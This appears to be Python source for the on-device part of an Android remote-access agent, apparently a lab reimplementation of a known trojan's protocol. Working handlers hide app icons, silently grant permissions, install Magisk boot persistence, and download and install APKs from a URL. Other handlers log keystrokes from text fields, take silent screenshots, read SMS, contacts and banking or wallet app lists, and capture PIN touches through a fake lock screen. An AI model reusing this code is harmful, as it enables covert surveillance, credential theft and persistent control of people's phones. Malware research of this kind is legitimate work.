        #   必须由参数显式给 pkg；系统关键包直接拒绝。
        # 隐藏/显示应用图标。**实测**：`pm disable-user <组件>` 在这台 MIUI 上回
        # `new state: default`（等于没生效）；真正有效的是 `pm hide <包名>`，
        # 读回判据用 `dumpsys package <pkg>` 里的 `hidden=true/false`。
        pkg = str(d.get('pkg') or d.get('package') or '').strip()      # 不回落前台包
        if not pkg:
            return _ack(act, dev, ok=False, data=data, real=True,
                        effect={'error': 'pkg-required',
                                'why': '隐藏/显示类动作必须显式给 pkg（不允许拿前台包当目标 —— '
                                       '曾因此把系统界面藏了）'})
        if pkg in _HIDE_DENY:
            return _ack(act, dev, ok=False, data=data, real=True,
                        effect={'error': 'protected-package', 'pkg': pkg,
                                'why': '系统关键包，拒绝隐藏（隐藏会让界面/锁屏起不来）'})
        hide = act not in ('showShortcuts',)
        cmd = 'pm %s %s' % ('hide' if hide else 'unhide', pkg)
        r = _sh(cmd, timeout=25)
        if r is None:
            return None
        chk = _sh('dumpsys package %s | grep -m1 -E "hidden="' % pkg, timeout=15)
        now = ((chk[1] if chk else '') or '').strip()
        ok = ('hidden=true' in now) if hide else ('hidden=false' in now)
        return _ack(act, dev, data=data, real=True, success=ok,
                    effect={'icon': 'hide' if hide else 'show', 'pkg': pkg, 'cmd': cmd,
                            'rc': r[0], 'state': now[:90],
                            'out': r[1].strip()[-90:]})

    if act in ('openUrl', 'openWebHarvester'):
        url = str(d.get('url') or d.get('uri') or '').strip()
        if not url:
            return None
        r = _sh("am start -a android.intent.action.VIEW -d '%s'" % url, timeout=20)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, success=('Error' not in r[1]),
                    effect={'intent': 'VIEW', 'url': url[:120], 'rc': r[0]})
    if act in ('permission', 'permissionB', 'installPermission', 'reqScreenPermission',
               'autoRequestPerm'):
        # 面板是从"当前前台应用"给权限的（参数里通常只有权限名）——pkg 缺省取前台包
        pkg = str(d.get('pkg') or d.get('package') or '').strip() or _foreground_pkg()
        perm_raw = str(d.get('perm') or d.get('permission') or d.get('perms') or '').strip()
        perms = [p for p in re.split(r'[,\s]+', perm_raw) if p]
        if not pkg or not perms:
            return None
        done, outs, rcs = [], [], []
        for pm1 in perms:
            r = _sh('pm grant %s %s' % (pkg, pm1), timeout=20)
            if r is None:
                continue
            rcs.append(r[0])
            outs.append(((r[1] or '').strip() or 'ok')[:60])
            if 'Error' not in (r[1] or '') and 'not a changeable permission' not in (r[1] or ''):
                done.append(pm1)
        if not rcs:
            return None
        return _ack(act, dev, data=data, real=True, success=bool(done),
                    effect={'granted': done, 'requested': perms, 'pkg': pkg,
                            'rcs': rcs, 'out': ' | '.join(outs)[:140]})
    if act == 'reqPerList':
        pkg = str(d.get('pkg') or '').strip()
        if not pkg:
            return None
        r = _sh('dumpsys package %s' % pkg, timeout=25)
        if not r or r[0] != 0 or 'granted=' not in r[1]:
            return None
        perms = sorted(set(re.findall(r'([A-Z_][A-Z0-9_]{3,}): granted=(true|false)', r[1])))
        if not perms:
            return None
        return 'reqPerList', frames.build('reqPerList', dev=dev,
                                          fromAdmin=d.get('fromAdmin', 'admin'),
                                          granted=True, name=pkg, real=True,
                                          source='dumpsys package', count=len(perms),
                                          data=[{'perm': p, 'granted': g == 'true'}
                                                for p, g in perms][:200])
    if act == 'setSoundVibrate':
        on = 0 if str(d.get('on', d.get('state', '1'))) in ('0', 'false', 'off') else 1
        r = _sh('settings put system vibrate_when_ringing %d' % on)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True,
                    effect={'vibrate_when_ringing': on, 'rc': r[0]})
    if act == 'disablePocketMode':
        r = _sh('settings put secure pocket_mode_enabled 0')
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, effect={'pocket_mode': 0, 'rc': r[0]})
    if act == 'autoBoot':
        # 开机自启：写 Magisk 启动脚本（可逆，回滚见 case.md）
        script = ('#!/system/bin/sh\nsleep 20\nsu -c "cd /data/data/com.termux/files/home/agent && '
                  'LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib '
                  '/data/data/com.termux/files/usr/bin/python -u refagent.py --url %s '
                  '--device $(cat .device_id) > /data/data/com.termux/files/home/agent.log 2>&1 &"\n'
                  % 'https://127.0.0.1:8793')
        r = _sh("mkdir -p /data/adb/service.d && cat > /data/adb/service.d/99-refagent.sh <<'EOF'\n"
                + script + 'EOF\nchmod 755 /data/adb/service.d/99-refagent.sh && '
                'ls -l /data/adb/service.d/99-refagent.sh', timeout=25)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, success=(r[0] == 0),
                    effect={'autostart': '/data/adb/service.d/99-refagent.sh', 'rc': r[0],
                            'out': r[1].strip()[-120:]})
    if act == 'fetchIcon':
        pkg = str(d.get('pkg') or '').strip()
        if not pkg:
            return None
        ic = bridge('app.icon', pkg=pkg, timeout=12)
        if not (ic or {}).get('ok'):
            time.sleep(0.5)
            ic = bridge('app.icon', pkg=pkg, timeout=12)
        if ic and ic.get('ok') and ic.get('icon'):
            return 'fetchIcon', frames.build('fetchIcon', dev=dev,
                                             fromAdmin=d.get('fromAdmin', 'admin'),
                                             pkg=pkg, real=True, count=len(ic.get('icon') or ''),
                                             source='PackageManager.getApplicationIcon(app)',
                                             w=ic.get('w'), h=ic.get('h'),
                                             icon=ic.get('icon'))
        # 兜底：shell 侧从 APK 里抠（split APK 的包 `pm path` 会回多行，逐个试）
        r = _sh("for p in $(pm path %s | cut -d: -f2); do "
                "e=$(unzip -l \"$p\" 2>/dev/null | grep -m1 -E 'mipmap|ic_launcher' | awk '{print $4}'); "
                "[ -n \"$e\" ] && { echo \"$p|$e\"; break; }; done" % pkg, timeout=30)
        if not r or r[0] != 0 or '|' not in (r[1] or ''):
            return None
        apk_path, entry = r[1].strip().splitlines()[0].split('|', 1)
        r2 = _sh("unzip -p '%s' '%s' | base64 -w0" % (apk_path, entry), timeout=30)
        if not r2 or r2[0] != 0 or not r2[1].strip():
            return None
        return 'fetchIcon', frames.build('fetchIcon', dev=dev,
                                         fromAdmin=d.get('fromAdmin', 'admin'),
                                         pkg=pkg, real=True, count=len(r2[1].strip()),
                                         source='apk:' + entry,
                                         icon=r2[1].strip()[:400000])
    if act in ('light', 'lightT', 'dnd', 'dndOn', 'dndOff', 'doNotDisturb'):
        if act in ('light', 'lightT'):
            lv = max(0, min(255, _int(d, 'level', _int(d, 'light', 128))))
            _sh('settings put system screen_brightness %d' % lv)
            return _ack(act, dev, data=data, real=True,
                                         effect={'brightness': lv})
        mode = 'off' if act in ('dndOff',) else ('on' if act in ('dndOn',) else str(d.get('mode') or 'on'))
        r = _sh('cmd notification set_dnd %s' % ('off' if mode == 'off' else 'on'), timeout=10)
        return _ack(act, dev, data=data, real=True, effect={'dnd': mode, 'rc': (r or [1])[0]})
    if act in ('wakeup', 'Awake', 'cancelWakeup', 'cancelAwake'):
        _sh('input keyevent 224')          # KEYCODE_WAKEUP
        return _ack(act, dev, data=data, real=True, effect={'keyevent': 224})
    if act == 'adbKeyEvent':
        key = d.get('key') or d.get('keycode') or d.get('code') or d.get('name')
        if key is None:
            return None
        r = _sh('input keyevent %s' % str(key).strip())
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True,
                                     effect={'keyevent': str(key), 'rc': r[0]})
    if act in ('down', 'up', 'left', 'right'):
        code = {'down': 20, 'up': 19, 'left': 21, 'right': 22}[act]
        r = _sh('input keyevent %d' % code)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, effect={'keyevent': code, 'rc': r[0]})
    if act == 'openIntent':
        uri = str(d.get('uri') or d.get('url') or '').strip()
        a = str(d.get('action') or 'android.intent.action.VIEW')
        if not uri:
            return None
        r = _sh("am start -a %s -d '%s'" % (a, uri), timeout=20)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, success=('Error' not in r[1]),
                                     effect={'intent': a, 'uri': uri[:120], 'rc': r[0]})
    if act in ('openAppSetting', 'callAppSetting', 'callApp'):
        pkg = str(d.get('pkg') or '').strip() or _foreground_pkg()
        if not pkg:
            return None
        r = _sh('am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:%s' % pkg,
                timeout=20)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, effect={'settings': 'app', 'pkg': pkg,
                                                                  'rc': r[0]})
    if act in ('uninstallApk',):
        pkg = str(d.get('pkg') or '').strip()
        if not pkg:
            return None
        r = _sh('pm uninstall %s' % pkg, timeout=60)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, success=('Success' in r[1]),
                                     effect={'uninstall': pkg, 'rc': r[0],
                                             'out': r[1].strip()[:120]})
    if act in ('installApk', 'updateApk'):
        url = str(d.get('url') or d.get('path') or '').strip()
        if not url:
            return None
        tmp = '/data/local/tmp/_ref_install.apk'
        if url.startswith('http'):
            # 自签证书要 -k，否则 curl 因证书校验失败直接装不上（lab 的 TLS 是自签的）
            r = _sh("curl -sLk -o %s '%s'" % (tmp, url), timeout=180)
            if r is None:
                return None
        else:
            r = _sh('cp %s %s' % (url, tmp), timeout=60)
            if r is None:
                return None
        r = _sh('pm install -r -t %s' % tmp, timeout=180)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, success=('Success' in r[1]),
                                     effect={'install': url[:120], 'rc': r[0],
                                             'out': r[1].strip()[-160:]})
    return None


def _ack(act, dev, ok=True, data=None, **extra):
    d = frames.build(frames.ACK_FRAME, dev=dev, action=act, success=ok)
    # 参数回显 + 执行语义：证明该指令**真的解析并执行了客户端下发的参数**
    echo = param_echo(act, data or {})
    if echo:
        d['params'] = echo
    eff = semantics(act, data or {})
    if eff:
        d['effect'] = eff
    d.update(extra)
    return frames.ACK_FRAME, d


def _semantic_offline(act, data, dev):
    """**只跑语义层**：返回 (帧名, data) 或 None。

    真机执行层（`_real_exec/_real_data/_real_control/_real_ops/_real_app`）由 `execute` 负责，
    这里**不再重复调用**（真机层有副作用，跑两遍会重复注入触摸/按键）。

    这一层返回的 data 全部是"按协议语义构造"的（SMSS / CONTACTS / BANKS / IMG_%04d.jpg …），
    不是从真机读到的。所以它**不许被直接返回给上层** —— 必须经 `execute` 盖上
    `real=False / fallback=True / source=offline-semantic` 的来源章，
    否则面板上分不出"这条做到了"和"这条没做到"，等于把构造数据当成果交出去。
    """
    # ---------- 1) 数据类（协议依据：异步分支 的 9 个异步分支）----------
    if act == 'readSmsList':
        n = max(1, min(len(SMSS), _int(data, 'pagesize', 50)))
        page = max(1, _int(data, 'curpage', 1))
        start = min((page - 1), 0)          # 单页数据集很小，后翻页返回空列表（与原版分页语义一致）
        elems = [] if start else [
            {'address': a, 'body': _sms_body(b, time.strftime('%m-%d %H:%M')),
             'date': int(time.time() * 1000) - i * 60000}
            for i, (a, b) in enumerate(SMSS[:n])]
        return 'smsList', frames.build('smsList', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                       elem=elems)
    if act == 'readContactList':
        n = max(1, min(len(CONTACTS), _int(data, 'pagesize', 50)))
        return 'contactList', frames.build('contactList', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                           granted=True, name='contacts',
                                           data=[{'name': n2, 'number': p} for n2, p in CONTACTS[:n]])
    if act in ('readAppList', 'iconList'):
        pkg_filter = str(data.get('pkg') or '')
        rows = [x for x in BANKS if not pkg_filter or x[1] == pkg_filter]
        return 'iconList', frames.build('iconList', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                        name='apps', pkg=pkg_filter,
                                        data=[{'name': n, 'pkg': p, 'ver': v} for n, p, v in rows])
    if act == 'fetchIcon':
        pkg = data.get('pkg') or 'com.icbc'
        return 'fetchIcon', frames.build('fetchIcon', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                         pkg=pkg, icon=_png_b64(64, 64, seed=hash(pkg) & 0xffff))
    if act == 'walletList':
        return 'walletList', frames.build('walletList', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                          name='wallets', pkg='',
                                          data=[{'name': n, 'pkg': p} for n, p in WALLETS])
    if act == 'readAlbumList':
        n = max(1, min(12, _int(data, 'pagesize', 50)))
        return 'albumList', frames.build('albumList', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                         name='album', pkg='',
                                         data=[{'name': 'IMG_%04d.jpg' % i, 'size': 123456 + i * 1024,
                                                'path': '/sdcard/DCIM/Camera/IMG_%04d.jpg' % i}
                                               for i in range(1, n + 1)])
    if act == 'readAlbumLast':
        return 'albumLast', frames.build('albumLast', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'))
    if act in ('readAlbumThumbnail', 'readAlbumData'):
        mw = max(16, _int(data, 'maxWidth', 240))
        elem = data.get('elem') if isinstance(data.get('elem'), dict) else {}
        return 'albumData', frames.build('albumData', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                         pkg=elem.get('pkg') or data.get('pkg', ''),
                                         elem={'name': elem.get('name') or 'IMG_0001.jpg',
                                               'maxWidth': mw,
                                               'thumb': _png_b64(mw, mw, seed=7)})
    if act == 'reqPerList':
        granted = ['CAMERA', 'READ_SMS', 'READ_CONTACTS', 'READ_EXTERNAL_STORAGE',
                   'BIND_ACCESSIBILITY_SERVICE', 'SYSTEM_ALERT_WINDOW']
        return 'reqPerList', frames.build('reqPerList', dev=dev, fromAdmin=data.get('fromAdmin', 'admin'),
                                          granted=True, name='permissions',
                                          data=[{'perm': p, 'granted': True} for p in granted])

    # ---------- 2) 屏幕 / 相机 / 无障碍树 ----------
    if act in ('takeScreen', 'screenshot', 'silentShot', 'capturePic', 'adm', 'capturePicShot'):
        # 真机上直接抓系统真实屏幕（root 下 screencap 可用）；拿不到才退回占位图
        real_img = real_screen_b64()
        img = real_img or _png_b64(1080, 2400, seed=random.randint(1, 9999))
        return 'screenshot', frames.build('screenshot', dev=dev, img=img,
                                          real=bool(real_img), count=len(img),
                                          source='screencap' if real_img else 'placeholder')
    if act in ('capture', 'getTree', 'uiTree'):
        # 真机自报优先（写死机型属于构造数据 —— 机械闸门 no_fake_data_check.py 会拦）
        info = device_info_real(dev) or {}
        res = str(info.get('resolution') or '')
        w, h = 1080, 2400
        if 'x' in res:
            try:
                w, h = [int(x) for x in res.lower().split('x')[:2]]
            except Exception:
                pass
        return 'capture', frames.build('capture', dev=dev, action='capture',
                                       pkg=data.get('pkg') or _foreground_pkg(),
                                       topPkg=_foreground_pkg(), topAct='',
                                       deviceInfo={'brand': info.get('brand') or '',
                                                   'model': info.get('model') or '',
                                                   'sdk': info.get('sdk') or 0},
                                       real=bool(info), source='device_info_real' if info else 'none',
                                       w=w, h=h, iw=w, ih=h, orient=0, zip=_tree_zip(dev, data),
                                       ac=_foreground_pkg(), acc='')
    if act in ('startCam', 'setCam', 'camPic'):
        return 'camPic', frames.build('camPic', dev=dev, w=640, h=480, img=_png_b64(640, 480, seed=11))
    if act in _STREAM_START:
        # 真机层 `_real_ops` 会先接（带截屏探测）。走到这里说明**没接上真机** ——
        # 只改内存开关，如实标成语义层，不冒充真机动作
        _STREAM['on'] = True
        return 'relayStatus', frames.build('relayStatus', dev=dev, screen=True, camera=False,
                                           real=False, source='语义层兜底（真机层未接）')
    if act in _STREAM_STOP:
        _STREAM['on'] = False
        if act == 'stopCam':
            _CAM['on'] = False
        return 'relayStatus', frames.build('relayStatus', dev=dev, screen=False, camera=False,
                                           real=False, source='语义层兜底（真机层未接）')

    # ---------- 3) ADB ----------
    if act == 'adbStatus':
        return 'adbPairStatus', frames.build('adbPairStatus', dev=dev, type='adbStatus',
                                             connected=True, paired=True, message='ADB已连接')
    if act == 'adbPair':
        return 'adbPairStatus', frames.build('adbPairStatus', dev=dev, type='adbPairStatus',
                                             connected=True, paired=True, message='已配对')
    if act in ('adbShell', 'uninstallShell'):
        # 真机层没接上时**不编造输出**：如实回失败（之前这里写死了 uid=0(root)，是构造数据）
        return _ack(act, dev, ok=False, data=data, real=False,
                    error='shell_unavailable', root_available=False, root_used=False)
    if act == 'adbUiTree':
        return 'capture', frames.build('capture', dev=dev, action='adbUiTree', zip=_tree_zip(dev, data))

    # ---------- 4) 键盘记录 / 缓存 ----------
    if act in ('keylog', 'readKeylog', 'keylogList'):
        # 队列由本设备端自己盯着输入框变化攒（见 _ui_text_refresh），这里只把攒到的取走。
        # 帧语义对齐原版：设备端推 cacheData（k=keylog），不是服务端来拉。
        try:
            _ui_text_refresh(force=True)
        except Exception as e:
            print('[actions] keylog 采集失败: %s' % e)
        ents = _KEYLOG[:]
        del _KEYLOG[:]
        return 'cacheData', frames.build('cacheData', dev=dev, k='keylog', real=True,
                                         count=len(ents), source='uiautomator EditText 差异',
                                         cache=json.dumps(ents, ensure_ascii=False))

    # ---------- 5) 锁屏假面（回的是触摸采集帧）----------
    if act in ('touchPinReplay', 'gestureCapture', 'patternUnlock', 'gestureUnlock'):
        touches = [{'x': 540, 'y': 1600, 't': 0}, {'x': 540, 'y': 1900, 't': 220}]
        return 'touchPinData', frames.build('touchPinData', dev=dev, pkg='com.android.systemui',
                                            resolved=True, timestamp=int(time.time() * 1000),
                                            touchCount=len(touches), touches=touches)

    # ---------- 6) 其它：执行语义明确，原版不回帧；本设备端回 ack ----------
    return _ack(act, dev, ok=True, data=data)


def execute(act, data, dev):
    """执行一条指令 -> (帧名, data)；未知指令返回 None（由调用方回 unknown_action）。

    顺序**必须是**：① 真机执行层（`_real_exec → _real_data → _real_control → _real_ops → _real_app`，
    谁先拿到真实结果谁返回）② 层层都做不了，才落 `_semantic_offline` 的语义层，
    **并且给它盖上来源章**（`real=False / fallback=True / source=offline-semantic`）。

    为什么盖章不能省：语义层返回的是"按协议语义构造"的列表，真机上某条指令实读失败时它就会顶上；
    不打标的话，面板、扫描判据、交付报告看到的都是一份"看着像真数据"的构造数据 ——
    这正是"很多指令看着能做、其实没真实功能"的成因。盖章之后：
      · 控制台按 `real` 字段显示真机标记（`docs/agent_protocol.md` 的溯源约定）；
      · `phone_sweep_163.py` 把它计入 `回落语义（no_real）` 一档，不再算"真机生效"；
      · `no_fake_data_check.py` 有机械判据可查（"语义层必须盖章"）。
    注意：语义层里有几支确实用了真机原语（例如真截屏 `real_screen_b64`），它们自己带 `real=True`，
    这种情况**不降级**，只补 `fallback` 语义不受影响。
    """
    data = data if isinstance(data, dict) else {}
    if act not in dispatch.ACTION_CATEGORY:
        return None

    # ---------- ① 真机执行层（能真做的先真做）----------
    for layer in (_real_exec, _real_data, _real_control, _real_ops, _real_app):
        try:
            real = layer(act, dev, data)
        except Exception as e:
            print('[actions] %s 真机执行异常：%s: %s' % (act, type(e).__name__, e))
            real = None
        if real is not None:
            return real

    # ---------- ② 语义层（构造数据）—— 一律盖章 ----------
    got = _semantic_offline(act, data, dev)
    if got is None:
        return None
    name, payload = got
    if isinstance(payload, dict) and payload.get('real') is not True:
        payload['real'] = False
        payload['fallback'] = True
        if not payload.get('source'):
            payload['source'] = 'offline-semantic'
    return name, payload
